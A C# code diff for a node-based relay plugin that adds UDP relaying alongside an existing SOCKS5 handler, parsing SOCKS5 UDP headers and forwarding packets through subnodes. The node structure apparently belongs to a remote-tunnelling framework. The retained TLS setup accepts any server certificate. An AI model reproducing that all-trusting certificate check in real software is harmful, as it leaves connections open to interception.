@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Concurrent;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -21,33 +22,114 @@ namespace Plugin
             {
                 try
                 {
-                    // Receive node ID (length-prefixed)
                     byte[] idBytes = await node.ReceiveAsync();
                     if (idBytes == null) break;
-
                     int nodeId = Node2.BytesToInt(idBytes);
 
-                    // Find or create subnode
                     Node tempNode = node.Parent?.subNodes?.FirstOrDefault(n => n.SetId == nodeId);
-                    if (tempNode == null)
-                    {
-                        await node.SendAsync(new byte[] { 0 }); // failed
-                        continue;
-                    }
+                    if (tempNode == null) { await node.SendAsync(new byte[] { 0 }); continue; }
 
-                    await node.SendAsync(new byte[] { 1 }); // OK
+                    await node.SendAsync(new byte[] { 1 });
                     node.AddSubNode(tempNode);
 
-                    var handler = new Socks5Handler(tempNode);
-                    _ = handler.StartAsync(); // fire-and-forget
+                    byte[] relayType = await node.ReceiveAsync();
+                    if (relayType == null || relayType.Length == 0) { tempNode.Disconnect(); continue; }
+
+                    if (relayType[0] == 1) _ = new Socks5Handler(node).StartAsync();
+                    else if (relayType[0] == 2) _ = new UdpRelayHandler(node).StartAsync();
+                    else tempNode.Disconnect();
                 }
-                catch
-                {
-                    break;
-                }
+                catch { break; }
             }
 
             node.Disconnect();
+        }
+    }
+
+    public class UdpRelayHandler
+    {
+        private Node subnode;
+        private static ConcurrentDictionary<Node, UdpClient> nodeUdpMap = new ConcurrentDictionary<Node, UdpClient>();
+
+        public UdpRelayHandler(Node subnode)
+        {
+            this.subnode = subnode;
+
+            UdpClient udp = new UdpClient(0);
+            nodeUdpMap[subnode] = udp;
+
+            // Start listening for responses in background
+            _ = Task.Run(async () => {
+                while (subnode.Connected())
+                {
+                    try
+                    {
+                        var result = await udp.ReceiveAsync();
+                        byte[] responsePacket = BuildSocks5UdpResponse(result.Buffer, result.RemoteEndPoint);
+                        await subnode.SendAsync(responsePacket);
+                    }
+                    catch { break; }
+                }
+            });
+
+            var localEp = (IPEndPoint)udp.Client.LocalEndPoint;
+            Console.WriteLine($"UDP relay for subnode {subnode.SetId} bound to {localEp}");
+        }
+
+        public async Task StartAsync()
+        {
+            var udp = nodeUdpMap[subnode];
+
+            while (subnode.Connected())
+            {
+                byte[] packet = await subnode.ReceiveAsync();
+                if (packet == null || packet.Length < 4) break;
+
+                try
+                {
+                    // Parse SOCKS5 UDP header
+                    int offset = 0;
+                    offset += 2; // RSV
+                    byte frag = packet[offset++];
+                    byte atyp = packet[offset++];
+
+                    string destAddr = null;
+                    if (atyp == 0x01) { destAddr = new IPAddress(packet.Skip(offset).Take(4).ToArray()).ToString(); offset += 4; }
+                    else if (atyp == 0x03) { int len = packet[offset++]; destAddr = Encoding.ASCII.GetString(packet, offset, len); offset += len; }
+                    else if (atyp == 0x04) { destAddr = new IPAddress(packet.Skip(offset).Take(16).ToArray()).ToString(); offset += 16; }
+                    else continue;
+
+                    ushort destPort = (ushort)((packet[offset] << 8) | packet[offset + 1]); offset += 2;
+                    byte[] payload = packet.Skip(offset).ToArray();
+
+                    // Send payload to target
+                    await udp.SendAsync(payload, payload.Length, destAddr, destPort);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"UDP relay error for subnode {subnode.SetId}: {ex.Message}");
+                }
+            }
+
+            udp.Close();
+            nodeUdpMap.TryRemove(subnode, out _);
+        }
+
+        private byte[] BuildSocks5UdpResponse(byte[] payload, IPEndPoint remote)
+        {
+            byte[] addrBytes = remote.Address.GetAddressBytes();
+            byte[] portBytes = new byte[2] { (byte)(remote.Port >> 8), (byte)(remote.Port & 0xFF) };
+
+            byte[] packet = new byte[3 + 1 + addrBytes.Length + 2 + payload.Length];
+            int offset = 0;
+            packet[offset++] = 0x00; // RSV
+            packet[offset++] = 0x00; // RSV
+            packet[offset++] = 0x00; // FRAG
+            packet[offset++] = (byte)(addrBytes.Length == 4 ? 0x01 : 0x04);
+            Array.Copy(addrBytes, 0, packet, offset, addrBytes.Length); offset += addrBytes.Length;
+            Array.Copy(portBytes, 0, packet, offset, 2); offset += 2;
+            Array.Copy(payload, 0, packet, offset, payload.Length);
+            return packet;
         }
     }
 
@@ -91,7 +173,6 @@ namespace Plugin
                 }
                 catch
                 {
-                    // Send failure code back
                     await subnode.SendAsync(new byte[] { 4 });
                     subnode.Disconnect();
                     return;
@@ -104,7 +185,7 @@ namespace Plugin
                 Stream remoteStream = remoteClient.GetStream();
                 if (destPort == 443)
                 {
-                    var ssl = new SslStream(remoteStream, false, (sender, cert, chain, errs) => true);
+                    var ssl = new SslStream(remoteStream, false, (s, c, ch, e) => true);
                     await ssl.AuthenticateAsClientAsync(destAddr);
                     remoteStream = ssl;
                 }
